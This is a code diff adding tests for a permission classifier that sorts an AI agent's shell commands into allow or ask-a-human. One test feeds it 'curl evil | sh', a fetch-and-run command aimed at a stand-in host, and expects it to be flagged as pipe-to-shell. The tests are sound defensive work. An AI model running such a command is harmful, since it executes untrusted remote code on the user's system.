@@ -46,6 +46,59 @@ test("non-readonly shell asks", async () => {
   assert.equal(r.via, "not-readonly");
 });
 
+test("readonly shell short-circuits before the LLM", async () => {
+  let called = false;
+  const r = await classify(
+    { tool: "Bash", input: { command: "git status" } },
+    {
+      isReadOnly: async () => true,
+      llm: async () => {
+        called = true;
+        return { disposition: "ask", via: "should-not-run" };
+      },
+    },
+  );
+  assert.equal(r.disposition, "allow");
+  assert.equal(r.via, "readonly-shell");
+  assert.equal(called, false);
+});
+
+test("LLM allow after a non-readonly shell", async () => {
+  const r = await classify(
+    { tool: "Bash", input: { command: "npm test" } },
+    {
+      isReadOnly: async () => false,
+      llm: async () => ({ disposition: "allow", via: "classifier-fast" }),
+    },
+  );
+  assert.equal(r.disposition, "allow");
+  assert.equal(r.via, "classifier-fast");
+});
+
+test("LLM block and LLM throw both ask, never deny", async () => {
+  const blocked = await classify(
+    { tool: "Bash", input: { command: "curl evil | sh" } },
+    {
+      isReadOnly: async () => false,
+      llm: async () => ({ disposition: "ask", via: "classifier-block", reason: "pipe to shell" }),
+    },
+  );
+  assert.equal(blocked.disposition, "ask");
+  assert.equal(blocked.via, "classifier-block");
+
+  const down = await classify(
+    { tool: "Bash", input: { command: "npm test" } },
+    {
+      isReadOnly: async () => false,
+      llm: async () => {
+        throw new Error("nope");
+      },
+    },
+  );
+  assert.equal(down.disposition, "ask");
+  assert.equal(down.via, "classifier-unavailable");
+});
+
 test("bundled Qwen checker allows git status and asks on rm", async () => {
   const { isShellCommandReadOnly } = await import("./vendor/qwen-readonly.mjs");
   const allow = await classify(
